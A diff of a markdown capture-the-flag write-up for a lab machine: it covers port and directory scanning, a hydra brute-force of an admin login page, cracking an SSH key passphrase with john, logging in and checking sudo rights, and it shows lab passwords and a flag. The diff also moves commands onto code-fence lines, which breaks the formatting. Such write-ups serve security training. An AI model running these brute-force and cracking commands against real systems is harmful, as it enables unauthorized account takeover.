@@ -25,22 +25,20 @@ Let's not waste any time. While the target machine is booting, I make a new basi
 
 After that, I make on my local machine a "`Brute-It`" and a "`nmap`" sub-folder where I will be saving my course material and the `nmap` scan results.
 
-![](/_attachment/e5fe9fb8b14d0c216c4a63ba8561990b_MD5.png)
+![1](./_attachment/e5fe9fb8b14d0c216c4a63ba8561990b_MD5.png)
 
 Once we know the target machine IP, we can start a terminal an add the `target IP` and `bruteit.thm` into the `/etc/hosts` file.
 
-```
-sudo nano /etc/hosts
+```sudo nano /etc/hosts
 ```
 
-![](CTF/TryHackMe/Brute%20It/_attachment/0277fd0cdd51ea82094d578a8b7fc226_MD5.png)
+![2](./_attachment/0277fd0cdd51ea82094d578a8b7fc226_MD5.png)
 
 ## Discovery of the Open Ports
 
 Let's discover using `nmap` what are the open ports on the target :  
 
-```
-nmap -sV -sV -oA nmap/initial bruteit.thm -v
+```nmap -sV -sV -oA nmap/initial bruteit.thm -v
 
 PORT   STATE SERVICE VERSION
 22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
@@ -52,17 +50,14 @@ Ok, HTTP on 80 and SSH on 22.  Classic!
 
 ### PORT 80 - HTTP - Apache httpd 2.4.29
 
-Let's check http://bruteit.thm in our your browser.  Nothing of interest here. Just the basic **Apache2 Web Server Default Page**.  
+Let's check `http://bruteit.thm` in our your browser.  Nothing of interest here. Just the basic **Apache2 Web Server Default Page**.  
 
 ## Hidden directories
 
 Are there some notable files and directories hidden from us on the HTTP server? 
 Let's do a quick scan and get an answer. I like using the tool `dirsearch` for a quick initial scan :
 
-```
-dirsearch -u http://bruteit.thm
-
-❯ dirsearch -u http://bruteit.thm
+```❯ dirsearch -u bruteit.thm
 
   _|. _ _  _  _  _ _|_    v0.4.2
  (_||| _) (/_(_|| (_| )
@@ -106,13 +101,13 @@ Task Completed
 
 That is one directory that is worth further investigation. Let's type 'http://bruteit.thm/admin' in our favorite Web Browser :
 
-![](CTF/TryHackMe/Brute%20It/_attachment/8b430ba0dea2dc37f1f18b4d52e67377_MD5.png)
+![3](./_attachment/8b430ba0dea2dc37f1f18b4d52e67377_MD5.png)
 
 This is what we are looking for.  A login page!
 
 Let's view the source code of this web page:
 
-![](CTF/TryHackMe/Brute%20It/_attachment/de34af8b42c95b4a41c9292ca2168c41_MD5.png)
+![4](./_attachment/de34af8b42c95b4a41c9292ca2168c41_MD5.png)
 
 Look at that! On line 26 someone left a comment in the code. It was obviously not indented for us but for a "john".
 
@@ -129,8 +124,7 @@ Now that we have a potentially valid username,  all we need now is to find the a
 
 We'll do that by using Hydra.  It is a nice password brute forcing tool: it is fast, easy to use and well documented.  The principle behind brute forcing is simple.  The tool is going to try to login using the now known `admin` user in combination with every password that are on an existing wordlist.  
 
-```
-❯ hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.235.217 http-post-form "/admin/index.php:user=^USER^&pass=^PASS^:Username or password invalid" -V
+```❯ hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.235.217 http-post-form "/admin/index.php:user=^USER^&pass=^PASS^:Username or password invalid" -V
 
 Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
 
@@ -169,15 +163,14 @@ Bingo! The valid credentials are brute-forced.
 
 > [!DONE]
 > User: admin
-> 
+>
 > Pass: xavier
-
 
 ---
 
 Let's go back to the web page to enter our valid credentials.
 
-![](CTF/TryHackMe/Brute%20It/_attachment/f60260a7cfdd3db110d2650d961dbe9a_MD5.png)
+![5](./_attachment/f60260a7cfdd3db110d2650d961dbe9a_MD5.png)
 
 *Right-Click* and save the `id_rsa` link to your machine.
 
@@ -188,8 +181,7 @@ The `id_rsa` is a Private Key file.  These files are used as credentials to conn
 
 First, let's create an **hash file** from `id_rsa`. I used a Python script named `ssh2john.py`.  When done, let's start John and wait while he does his business:
 
-```
-❯ ssh2john id_rsa > hash.txt
+```❯ ssh2john id_rsa > hash.txt
 
 ❯ john id_rsa.hash --fork=4 -w=/usr/share/wordlists/rockyou.txt
 Using default input encoding: UTF-8
@@ -211,20 +203,18 @@ We got a match!  The **password** is : `rockinroll`
 
 We want to change file permission of id_rsa:
 
-```
-chmod 400 id_rsa
+```chmod 400 id_rsa
 ls -la
 ```
 
-![](CTF/TryHackMe/Brute%20It/_attachment/8225b5c5c84d9f929a27f674bd5165fb_MD5.png)
+![6](./_attachment/8225b5c5c84d9f929a27f674bd5165fb_MD5.png)
 We can see now that `id_rsa` is read-only and for a single user, me.
 
 ## PORT 22 - SSH - OpenSSH 7.6p1
 
 Let use everything we have gathered so far and connect user john on SSH using the cracked password:
 
-```
-❯ ssh -i id_rsa john@bruteit.thm
+```❯ ssh -i id_rsa john@bruteit.thm
 The authenticity of host 'bruteit.thm (10.10.150.236)' can't be established.
 ED25519 key fingerprint is SHA256:kuN3XXc+oPQAtiO0Gaw6lCV2oGx+hdAnqsj/7yfrGnM.
 This key is not known by any other names.
@@ -233,10 +223,10 @@ Warning: Permanently added 'bruteit.thm' (ED25519) to the list of known hosts.
 Enter passphrase for key 'id_rsa': 
 
 ```
+
 And...
 
-```
-Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-118-generic x86_64)
+```Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-118-generic x86_64)
 
  * Documentation:  https://help.ubuntu.com
  * Management:     https://landscape.canonical.com
@@ -255,15 +245,13 @@ john@bruteit:~$
 
 We are in! As john.  Check around quickly to find the `user.txt`
 
-```
-john@bruteit:~$ ls
+```john@bruteit:~$ ls
 user.txt
 ```
 
 ## Now let's get root
 
-```
-john@bruteit:~$ sudo -l
+```john@bruteit:~$ sudo -l
 Matching Defaults entries for john on bruteit:
     env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
 
@@ -276,4 +264,4 @@ THM{pr1v1l3g3_3sc4l4t10n}
 john@bruteit:~$
 ```
 
-## COMPLETED!
+## COMPLETED
